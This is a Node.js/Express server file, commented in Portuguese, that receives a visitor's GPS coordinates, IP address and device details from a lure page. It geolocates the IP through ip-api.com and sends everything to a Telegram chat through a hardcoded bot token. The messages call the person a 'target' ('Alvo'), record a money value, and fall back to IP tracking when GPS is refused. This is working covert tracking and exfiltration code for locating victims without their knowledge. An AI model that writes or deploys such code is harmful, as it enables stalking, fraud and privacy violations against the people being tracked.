// server.js - COM GEOLOCALIZAÇÃO DE IP AUTOMÁTICA
const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");

const app = express();
app.use(cors());
app.use(bodyParser.json());

// Seus dados do Telegram
const TELEGRAM_BOT_TOKEN = "8510330829:AAG5Z_9XupX2x_GqeXPgfAooOjVC61L78v8";
const TELEGRAM_CHAT_ID = "-5124871642";

app.post("/send-location", async (req, res) => {
  // 1. Recebe os dados do Front-end
  const {
    latitude, longitude, maps,
    nome, valor,
    bateria, conexao, ram, cpu, tela, navegador
  } = req.body;

  // 2. CAPTURA O IP REAL
  const ipBruto = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const userIp = ipBruto ? ipBruto.split(',')[0].trim() : "Oculto";

  // 3. CONSULTA AUTOMÁTICA DO IP (A novidade está aqui!)
  let provedor = "Desconhecido";
  let cidade = "Desconhecida";
  let estado = "";

  try {
    // Só consulta se tiver um IP válido (não for localhost)
    if (userIp && userIp !== "Oculto" && userIp.length > 6) {
      const geo = await axios.get(`http://ip-api.com/json/${userIp}`);
      if (geo.data && geo.data.status === 'success') {
        provedor = geo.data.isp;    // Ex: Vivo, Claro, Net
        cidade = geo.data.city;     // Ex: São Paulo
        estado = geo.data.region;   // Ex: SP
      }
    }
  } catch (e) {
    console.log("Erro ao consultar API de IP:", e.message);
  }

  let message = "";

  // --- CENÁRIO 1: SUCESSO (Tem GPS) ---
  if (latitude && longitude) {
    message = `
🚨 <b>LOCALIZAÇÃO CAPTURADA!</b> 🚨

🎯 <b>Alvo:</b> ${nome || '?'} | 💰 <b>R$</b> ${valor || '?'}

📍 <b>Lat:</b> <code>${latitude}</code>
📍 <b>Long:</b> <code>${longitude}</code>
🗺️ <b>Maps:</b> ${maps}

🌐 <b>DADOS DE REDE (IP):</b>
🆔 <b>IP:</b> <code>${userIp}</code>
🏢 <b>Provedor:</b> ${provedor}
🏙️ <b>Local:</b> ${cidade} - ${estado}

📱 <b>DISPOSITIVO:</b>
🔋 Bat: ${bateria} | 📡 ${conexao}
💻 CPU: ${cpu} | 💾 RAM: ${ram}
🖥️ Tela: ${tela}
`;
  }
  // --- CENÁRIO 2: PLANO B (Só IP) ---
  else {
    message = `
⛔ <b>GPS BLOQUEADO (PLANO B)</b> ⛔

O alvo negou o GPS, mas rastreamos a rede!

🌐 <b>RASTREAMENTO DE IP:</b>
🆔 <b>IP:</b> <code>${userIp}</code>
🏢 <b>Provedor:</b> ${provedor}
🏙️ <b>Local Aproximado:</b> ${cidade} - ${estado}

🎯 <b>Alvo:</b> ${nome || '?'}

📱 <b>DISPOSITIVO:</b>
🔋 Bat: ${bateria}
📡 Conexão: ${conexao}
🖥️ Tela: ${tela}
🌐 Nav: ${navegador}
`;
  }

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "HTML"
    });

    res.status(200).json({ success: true });
  } catch (error) {
    console.log(error);
    res.status(500).json({ success: false, message: "Erro no envio." });
  }
});

const port = process.env.PORT || 8088;
app.listen(port, () => {
  console.log(`Servidor rodando na porta ${port}`);
});

app.use(express.static(__dirname));
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});
